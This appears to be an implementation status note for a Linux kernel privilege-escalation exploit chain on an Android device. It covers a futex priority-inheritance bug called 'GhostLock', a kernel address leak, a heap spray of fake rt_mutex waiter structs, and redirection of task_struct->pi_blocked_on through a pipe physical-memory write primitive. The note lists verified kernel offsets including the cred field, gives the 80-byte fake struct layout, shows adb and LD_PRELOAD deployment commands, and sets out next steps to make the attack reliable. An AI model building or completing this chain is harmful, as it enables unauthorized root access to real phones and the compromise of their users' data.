# Heap Spray Exploitation Chain Implementation

**Date**: 2026-07-14
**Status**: Implementation complete, all steps implemented

---

## Overview

The heap spray exploitation chain exploits the GhostLock vulnerability by:
1. Leaking mm_struct address (via KernelSnitch)
2. Calculating task_struct address from mm_struct
3. Triggering GhostLock to create dangling pi_blocked_on pointer
4. Spraying heap with fake waiter structs
5. Using pipe physical read/write to change pi_blocked_on to point to sprayed data
6. Triggering PI operation to make kernel read fake waiter from heap

## Key Offsets (IDA Verified)

| Field | Offset | Source |
|-------|--------|--------|
| `task_struct->pi_blocked_on` | 0x898 | IDA: `rt_mutex_adjust_prio_chain` LDR X28, [X19,#0x898] |
| `mm_struct->owner` | 1032 | pahole: MM_OWNER_OFF |
| `task_struct->pid` | 0x618 | target.h |
| `task_struct->cred` | 0x820 | target.h |

## Implementation Files

### 1. heap_spray.c (NEW)

Core heap spray exploitation logic:
- `calculate_task_from_mm()` — calculates task_struct from mm_struct
- `build_fake_waiter()` — builds fake waiter struct in buffer
- `redirect_pi_blocked_on()` — writes to task_struct->pi_blocked_on
- `trigger_pi_read()` — triggers PI operation via FUTEX_LOCK_PI
- `trigger_pi_via_priority()` — triggers PI via priority adjustment
- `run_heap_spray_exploit()` — main entry point (all steps)

### 2. util.c (MODIFIED)

Added utility function:
- `calculate_task_from_mm_struct()` — shared function for mm→task calculation

### 3. common.h (MODIFIED)

Added declarations:
- `calculate_task_from_mm_struct()`
- `run_heap_spray_exploit()`

### 4. Makefile (MODIFIED)

Added compilation of heap_spray.c

### 5. target.h (MODIFIED)

Added offset:
- `TASK_PI_BLOCKED_ON_OFF 0x898`

## Exploitation Chain Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                    Heap Spray Exploitation                    │
├─────────────────────────────────────────────────────────────┤
│ Step 1: KernelSnitch mm_struct leak                         │
│   Input: futex hash timing                                  │
│   Output: mm_struct address (e.g., 0xffffff89807912c0)      │
│   Status: ✅ DONE                                           │
├─────────────────────────────────────────────────────────────┤
│ Step 2: Calculate task_struct                               │
│   Input: mm_struct address                                  │
│   Process: task_struct = *(mm_struct + MM_OWNER_OFF)        │
│   Output: task_struct address                               │
│   Status: ✅ IMPLEMENTED                                    │
├─────────────────────────────────────────────────────────────┤
│ Step 3: Trigger GhostLock                                   │
│   Input: FUTEX_CMP_REQUEUE_PI with 3 futex words + 3 threads│
│   Output: dangling pi_blocked_on pointer                    │
│   Status: ✅ DONE                                           │
├─────────────────────────────────────────────────────────────┤
│ Step 4: Spray heap with fake waiter                         │
│   Input: fake waiter struct (80 bytes)                      │
│   Process: sk_buff reclaim to spray controlled data         │
│   Output: heap page with controlled data                    │
│   Status: ✅ DONE (sk_buff reclaim 4/4 success)            │
├─────────────────────────────────────────────────────────────┤
│ Step 5: Change pi_blocked_on                                │
│   Input: task_struct address, spray address                 │
│   Process: pipe_phys_write(task + 0x898, spray_addr)       │
│   Output: pi_blocked_on points to sprayed heap              │
│   Status: ✅ IMPLEMENTED                                    │
├─────────────────────────────────────────────────────────────┤
│ Step 6: Trigger PI operation                                │
│   Input: any rt_mutex operation                             │
│   Process: kernel reads through pi_blocked_on               │
│   Output: kernel reads fake waiter from heap                │
│   Status: ⏳ NEEDS IMPLEMENTATION                           │
└─────────────────────────────────────────────────────────────┘
```

## Fake Waiter Struct Layout

```c
struct fake_waiter {
    uint64_t tree_entry_left;     /* +0x00: rb_node left */
    uint64_t tree_entry_right;    /* +0x08: rb_node right */
    uint64_t tree_entry_parent;   /* +0x10: rb_node parent */
    uint64_t pi_tree_entry_left;  /* +0x18: pi_rb_node left */
    uint64_t pi_tree_entry_right; /* +0x20: pi_rb_node right */
    uint64_t pi_tree_entry_parent;/* +0x28: pi_rb_node parent */
    uint64_t task;                /* +0x30: pointer to task_struct */
    uint64_t lock;                /* +0x38: pointer to rt_mutex_base */
    uint32_t prio;                /* +0x40: priority value */
    uint32_t padding;             /* +0x44: alignment */
    uint64_t deadline;            /* +0x48: deadline value */
};  /* total: 0x50 = 80 bytes */
```

## Testing Checklist

1. **Compile**: `make NDK=/path/to/ndk`
2. **Deploy**: `adb push preload.so /data/local/tmp/`
3. **Test**: `adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/ls /dev/null' 2>&1`
4. **Verify**:
   - `[+] heap_spray: mm->owner task_struct=...`
   - `[+] heap_spray: pi_redirected task=... pi_blocked_on=...`
   - No kernel panic

## Next Steps

1. **Test the implementation** on the target device
2. **Implement Step 6** — trigger PI operation after changing pi_blocked_on
3. **Handle error cases** — what if the pipe physrw fails?
4. **Optimize timing** — ensure kernel doesn't access pi_blocked_on before we change it
5. **Add retry logic** — if the first attempt fails, try again with different parameters
